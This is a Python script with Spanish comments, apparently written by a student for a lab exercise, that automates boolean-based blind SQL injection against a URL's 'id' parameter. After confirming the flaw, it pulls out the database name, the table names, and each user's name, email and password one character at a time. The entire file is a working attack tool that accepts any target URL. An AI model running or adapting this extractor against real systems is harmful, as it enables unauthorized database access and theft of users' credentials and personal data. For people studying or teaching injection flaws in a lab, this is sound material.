# Creado por Jonathan Carrero (jonathan.carrero@alumnos.ui1.es)
#!/usr/bin/env python3
"""
Blind SQL Injection Extractor
Automatiza la extracción de datos usando Boolean-based Blind SQLi
"""

import requests
import string
import time
import sys

class BlindSQLiExtractor:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.charset = string.ascii_letters + string.digits + '_@.-'
        
    def test_vulnerability(self):
        """Prueba si el parámetro es vulnerable a Blind SQLi"""
        print("[*] Probando vulnerabilidad Blind SQLi...")
        
        true_payload = "1 AND 1=1"
        true_response = self.make_request(true_payload)
        
        false_payload = "1 AND 1=2"
        false_response = self.make_request(false_payload)
        
        if true_response != false_response:
            print("[+] ¡Vulnerabilidad Blind SQLi confirmada!")
            return True
        else:
            print("[-] No se detectó vulnerabilidad Blind SQLi")
            return False
    
    def make_request(self, payload):
        """Envía request con payload y devuelve respuesta"""
        try:
            url = f"{self.base_url}?id={payload}"
            response = self.session.get(url, timeout=10)
            return response.text
        except Exception as e:
            print(f"[!] Error en request: {e}")
            return None
    
    def extract_length(self, query, max_length=50):
        """Extrae la longitud de una consulta"""
        print(f"[*] Extrayendo longitud de: {query}")
        
        for length in range(1, max_length + 1):
            payload = f"1 AND LENGTH(({query}))={length}"
            response = self.make_request(payload)
            
            if response and "Artículo Encontrado" in response:
                print(f"[+] Longitud encontrada: {length}")
                return length
            
            # Progreso visual
            if length % 10 == 0:
                print(f"[*] Probando longitud {length}...")
        
        print("[-] No se pudo determinar la longitud")
        return 0
    
    def extract_string(self, query, length):
        """Extrae una cadena carácter por carácter"""
        result = ""
        print(f"[*] Extrayendo cadena de {length} caracteres...")
        
        for position in range(1, length + 1):
            found_char = False
            
            for char in self.charset:
                payload = f"1 AND SUBSTRING(({query}),{position},1)='{char}'"
                response = self.make_request(payload)
                
                if response and "Artículo Encontrado" in response:
                    result += char
                    found_char = True
                    print(f"[+] Posición {position}: '{char}' -> {result}")
                    break
            
            if not found_char:
                result += "?"
                print(f"[-] Posición {position}: carácter no encontrado -> {result}")
        
        return result
    
    def extract_database_name(self):
        """Extrae el nombre de la base de datos"""
        print("\n" + "="*50)
        print("EXTRAYENDO NOMBRE DE BASE DE DATOS")
        print("="*50)
        
        query = "SELECT database()"
        length = self.extract_length(query)
        if length > 0:
            db_name = self.extract_string(query, length)
            print(f"[+] Nombre de base de datos: {db_name}")
            return db_name
        return None
    
    def count_tables(self, database):
        """Cuenta el número de tablas en la base de datos"""
        print(f"\n[*] Contando tablas en base de datos '{database}'...")
        
        for count in range(1, 20):
            query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database}'"
            payload = f"1 AND ({query})={count}"
            response = self.make_request(payload)
            
            if response and "Artículo Encontrado" in response:
                print(f"[+] Número de tablas: {count}")
                return count
        
        return 0
    
    def extract_table_names(self, database, table_count):
        """Extrae los nombres de las tablas"""
        print("\n" + "="*50)
        print("EXTRAYENDO NOMBRES DE TABLAS")
        print("="*50)
        
        tables = []
        
        for i in range(table_count):
            print(f"\n[*] Extrayendo tabla {i+1} de {table_count}...")
            
            # Obtener nombre de la tabla
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {i},1"
            length = self.extract_length(query, 30)
            
            if length > 0:
                table_name = self.extract_string(query, length)
                tables.append(table_name)
                print(f"[+] Tabla encontrada: {table_name}")
        
        return tables
    
    def extract_user_data(self, database):
        """Extrae datos específicos de la tabla users"""
        print("\n" + "="*50)
        print("EXTRAYENDO DATOS DE USUARIOS")
        print("="*50)
        
        # Contar usuarios
        print("[*] Contando usuarios...")
        user_count = 0
        for count in range(1, 10):
            payload = f"1 AND (SELECT COUNT(*) FROM {database}.users)={count}"
            response = self.make_request(payload)
            if response and "Artículo Encontrado" in response:
                user_count = count
                break
        
        print(f"[+] Número de usuarios: {user_count}")
        
        users = []
        for i in range(user_count):
            print(f"\n[*] Extrayendo usuario {i+1} de {user_count}...")
            user = {}
            
            # Extraer nombre de usuario
            query = f"SELECT name FROM {database}.users LIMIT {i},1"
            length = self.extract_length(query, 30)
            if length > 0:
                user['name'] = self.extract_string(query, length)
            
            # Extraer email
            query = f"SELECT email FROM {database}.users LIMIT {i},1"
            length = self.extract_length(query, 50)
            if length > 0:
                user['email'] = self.extract_string(query, length)
            
            # Extraer password (primeros 10 caracteres por velocidad)
            query = f"SELECT password FROM {database}.users LIMIT {i},1"
            length = min(self.extract_length(query, 70), 20)  # Limitar para demo
            if length > 0:
                user['password'] = self.extract_string(query, length)
            
            users.append(user)
            print(f"[+] Usuario {i+1}: {user}")
        
        return users
    
    def run_full_extraction(self):
        """Ejecuta extracción completa"""
        print("🔍 BLIND SQL INJECTION EXTRACTOR")
        print("="*50)
        
        # Verificar vulnerabilidad
        if not self.test_vulnerability():
            return
        
        # Extraer nombre de base de datos
        database = self.extract_database_name()
        if not database:
            print("[-] No se pudo extraer nombre de base de datos")
            return
        
        # Contar y extraer tablas
        table_count = self.count_tables(database)
        if table_count > 0:
            tables = self.extract_table_names(database, table_count)
            print(f"\n[+] Tablas encontradas: {tables}")
        
        # Extraer datos de usuarios
        if 'users' in str(tables):
            users = self.extract_user_data(database)
            
            print("\n" + "="*50)
            print("RESUMEN DE EXTRACCIÓN")
            print("="*50)
            print(f"Base de datos: {database}")
            print(f"Tablas: {tables}")
            print("Usuarios extraídos:")
            for i, user in enumerate(users, 1):
                print(f"  {i}. {user}")
        
        print("\n[+] ¡Extracción completada!")

def main():
    if len(sys.argv) != 2:
        print("Uso: python blind_sqli_extractor.py <URL_BASE>")
        print("Ejemplo: python blind_sqli_extractor.py http://localhost/news.php")
        sys.exit(1)
    
    base_url = sys.argv[1]
    extractor = BlindSQLiExtractor(base_url)
    extractor.run_full_extraction()

if __name__ == "__main__":
    main()